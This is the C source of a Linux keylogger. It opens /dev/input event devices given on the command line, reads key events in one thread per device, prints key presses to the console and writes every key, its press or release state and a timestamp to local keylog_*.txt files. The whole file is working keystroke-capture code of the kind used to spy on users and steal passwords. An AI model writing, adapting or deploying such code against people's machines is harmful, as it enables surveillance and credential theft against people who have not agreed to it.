#include "keys.h"
#include <err.h>
#include <fcntl.h>
#include <linux/input.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define KEYS_MAX_INDEX 194

typedef struct {
  char *path;
} worker_arg_t;

char *get_event_file(char *str) {
  char *token = strtok(str, "/");
  char *last = NULL;

  while (token != NULL) {
    last = token;
    token = strtok(NULL, "/");
  }

  return last;
}

void *worker(void *arg) {
  worker_arg_t *w = (worker_arg_t *)arg;
  char *path = w->path;

  int fd = open(path, O_RDONLY);
  if (fd == -1)
    err(EXIT_FAILURE, "open %s", path);

  char *event_file = get_event_file(path);

  char filename[256];
  snprintf(filename, sizeof(filename), "keylog_%s.txt", event_file);

  int out_fd = open(filename, O_CREAT | O_WRONLY | O_TRUNC, 0644);
  if (out_fd == -1)
    err(EXIT_FAILURE, "open keylog.txt");

  struct input_event event;

  puts("Listening...");

  for (;;) {
    ssize_t n = read(fd, &event, sizeof(event));
    if (n == -1)
      err(EXIT_FAILURE, "read");
    if (n != sizeof(event))
      continue;

    if (event.type != EV_KEY)
      continue;

    if (event.code > KEYS_MAX_INDEX)
      continue;

    const char *state;

    switch (event.value) {
    case 0:
      state = " UP ";
      break;
    case 1:
      state = " DOWN ";
      printf("%s", hr_keys[event.code]);
      fflush(stdout);
      break;
    default:
      continue;
    }

    if (write(out_fd, keys[event.code], strlen(keys[event.code])) == -1)
      err(EXIT_FAILURE, "write event");
    if (write(out_fd, state, strlen(state)) == -1)
      err(EXIT_FAILURE, "write state");

    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    char timestamp[256];
    snprintf(timestamp, sizeof(timestamp), "- [%d-%02d-%02d %02d:%02d:%02d]\n",
             tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour,
             tm.tm_min, tm.tm_sec);
    if (write(out_fd, timestamp, strlen(timestamp)) == -1)
      err(EXIT_FAILURE, "log_time");
  }

  /* close(fd);
  close(out_fd);
  free(w);
  return NULL; */
}

int main(int argc, char *argv[]) {

  if (argc < 2) {
    printf("Usage: %s <event-file>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  int n_devices = argc - 1;
  pthread_t threads[n_devices];

  for (int i = 1; i < argc; i++) {
    worker_arg_t *w = malloc(sizeof(worker_arg_t));
    w->path = argv[i];

    if (pthread_create(&threads[i - 1], NULL, worker, w) != 0)
      err(EXIT_FAILURE, "pthread_create");
  }

  for (int i = 0; i < n_devices; i++)
    pthread_join(threads[i], NULL);

  return 0;
}
